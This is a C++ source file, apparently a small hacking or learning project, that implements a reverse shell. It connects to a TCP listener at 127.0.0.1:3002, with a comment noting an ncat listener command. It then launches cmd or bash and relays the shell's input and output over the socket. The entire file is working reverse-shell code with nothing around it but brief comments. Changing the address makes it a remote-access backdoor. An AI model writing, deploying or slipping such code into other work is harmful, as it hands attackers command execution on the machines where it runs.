#pragma once
#include <boost/process.hpp>
#include <iostream>
#include <boost/thread/thread_functors.hpp>
#include <boost/algorithm/string.hpp>
#include <boost/asio.hpp>


int main()
{
	// ncat -lvk 3002
	// -v verbose -l listen mode
	// Server Ip and port, no need to resolve
	std::string ip_address_str = "127.0.0.1";
	unsigned short port = 3002;

	try
	{
		// Create the endpoint from the ip string
		boost::asio::ip::tcp::endpoint
			ep(boost::asio::ip::address::from_string(ip_address_str),
			   port);

		boost::asio::io_service ios;

		// Create the socket.
		boost::asio::ip::tcp::socket sock(ios, ep.protocol());

		// Connect
		sock.connect(ep);


		boost::process::ipstream process_input_stream;
		boost::process::opstream process_output_stream;

		boost::process::child c(
#ifdef _WIN32
			boost::process::search_path("cmd"),
#elif  linux
			boost::process::search_path("bash"),
#endif
			// Pipe process_output_stream to Process StdIn
			boost::process::std_in < process_output_stream,
			// Pipe Process StdOut and StdErr to process_input_stream
			(boost::process::std_out & boost::process::std_err) > process_input_stream
		);


		// Pipe Network to Shell
		boost::thread net_reader([&]()
		{
			std::array<char, 1024> cmd;

			try
			{
				do
				{
					const size_t read_so_far = sock.read_some(boost::asio::buffer(cmd));

					process_output_stream.write(cmd.data(), read_so_far);
					process_output_stream.flush();
				}
				// while (!boost::iequals("exit", cmd));
				while (true);
			}
			catch (...)
			{
			}

			// Shutdown the shell process
			process_output_stream.pipe().close();
			process_input_stream.pipe().close();
			c.terminate();
		});


		// Pipe Shell to Network
		std::thread shell_reader([&]
		{
			char buffer[1024];
			try
			{
				while (true)
				{
					if (!c.running())
						break;

					const int read_so_far = process_input_stream.pipe().read(buffer, 1024);
					buffer[read_so_far] = 0;
					// boost::asio::write(sock, boost::asio::buffer(buffer, read_so_far));
					sock.write_some(boost::asio::buffer(buffer, read_so_far));
				}
			}
			catch (...)
			{
			}

			// Shutdown the network socket
			sock.shutdown(boost::asio::socket_base::shutdown_both);
			sock.close();
		});


		c.wait();
		net_reader.join();
		shell_reader.join();
		process_output_stream.pipe().close();
		process_input_stream.pipe().close();

		int exit_code = c.exit_code();
	}
	catch (boost::system::system_error& e)
	{
		std::cout << "Error occured! Error code = " << e.code()
			<< ". Message: " << e.what();

		return e.code().value();
	}


	return 0;
}
